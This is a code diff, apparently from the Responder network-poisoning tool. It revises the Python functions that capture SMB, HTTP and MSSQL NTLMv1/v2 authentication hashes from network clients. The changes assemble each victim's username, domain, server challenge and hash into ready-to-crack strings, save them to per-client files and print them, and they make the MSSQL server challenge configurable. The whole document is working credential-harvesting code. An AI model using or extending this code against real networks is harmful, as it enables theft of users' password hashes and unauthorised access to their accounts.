@@ -270,24 +270,25 @@ def ParseHash(data,client):
     Bcc = struct.unpack('<H',data[63:65])[0]
     if NthashLen > 60:
        Hash = data[65+LMhashLen:65+LMhashLen+NthashLen]
-       print "[+]SMB-NTLMv2 Hash Captured"
-       print "[+]SMB-NTLMv2 Hash is :",Hash.encode('hex').upper()
+       print "[+]SMB-NTLMv2 hash captured"
        outfile = "SMB-NTLMv2-Client-"+client+".txt"
        pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
        var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
        Username, Domain = tuple(var)
-       WriteData(outfile,Username+"::"+Domain+":"+NumChal+":"+Hash.encode('hex')[:32].upper()+":"+Hash.encode('hex')[32:].upper())
+       Writehash = Username+"::"+Domain+":"+NumChal+":"+Hash.encode('hex')[:32].upper()+":"+Hash.encode('hex')[32:].upper()
+       WriteData(outfile,Writehash)
+       print "[+]SMB-NTLMv2 complete hash is :",Writehash
        print "Username : ",Username
        print "Domain (if joined, if not then computer name) : ",Domain
     if NthashLen == 24:
-       print "[+]SMB-NTLMv1 Hash Captured"
-       print "[+]SMB-LM Hash is :", data[65:65+LMhashLen].encode('hex').upper()
-       print "[+]SMB-NT Hash is :", data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex').upper()
+       print "[+]SMB-NTLMv1 hash captured"
        outfile = "SMB-NTLMv1-Client-"+client+".txt"
        pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
        var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
        Username, Domain = tuple(var)
-       WriteData(outfile,Username+"::"+Domain+":"+data[65:65+LMhashLen].encode('hex').upper()+":"+data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex').upper()+":"+NumChal)
+       writehash = Username+"::"+Domain+":"+data[65:65+LMhashLen].encode('hex').upper()+":"+data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex').upper()+":"+NumChal
+       WriteData(outfile,writehash)
+       print "[+]SMB complete hash is :", writehash
        print "Username : ",Username
        print "Domain (if joined, if not then computer name) : ",Domain
     packet = data[:]
@@ -463,7 +464,7 @@ class MSSQLNTLMChallengeAnswer(Packet):
         ("TargetNameMaxLen", "\x06\x00"),
         ("TargetNameOffset", "\x38\x00\x00\x00"),
         ("NegoFlags",        "\x05\x02\x89\xa2"),
-        ("ServerChallenge",  "\x11\x22\x33\x44\x55\x66\x77\x88"),
+        ("ServerChallenge",  Challenge),
         ("Reserved",         "\x00\x00\x00\x00\x00\x00\x00\x00"),
         ("TargetInfoLen",    "\x7e\x00"),
         ("TargetInfoMaxLen", "\x7e\x00"),
@@ -793,9 +794,7 @@ def ParseHTTPHash(data,client):
     NTHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
     if NthashLen == 24:
        print "[+]HTTP NTLMv1 Hash detected"
-       print "LM hash is: ",LMHash
        NtHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
-       print "NT Hash is: ", NtHash
        HostNameLen = struct.unpack('<H',data[46:48])[0]
        HostNameOffset = struct.unpack('<H',data[48:50])[0]
        Hostname = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
@@ -805,11 +804,12 @@ def ParseHTTPHash(data,client):
        User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
        print "User is :", data[UserOffset:UserOffset+UserLen].replace('\x00','')
        outfile = "HTTP-NTLMv1-Client-"+client+".txt"
-       WriteData(outfile,User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal)
+       WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
+       WriteData(outfile,WriteHash)
+       print "Captured hash is : ", WriteHash
     if NthashLen > 24:
        print "[+]HTTP NTLMv2 Hash detected"
        NthashLen = 64
-       print "NTLMV2 Hash is : ", NTHash
        DomainLen = struct.unpack('<H',data[28:30])[0]
        DomainOffset = struct.unpack('<H',data[32:34])[0]
        Domain = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
@@ -823,7 +823,9 @@ def ParseHTTPHash(data,client):
        HostName =  data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
        print "Hostname is :", HostName
        outfile = "HTTP-NTLMv2-Client-"+client+".txt"
-       WriteData(outfile,User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:])
+       WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
+       WriteData(outfile,WriteHash)
+       print "Complete hash is : ", WriteHash
 
 # Function used to check if we answer with a Basic or NTLM auth. 
 def Basic_Ntlm(Basic):
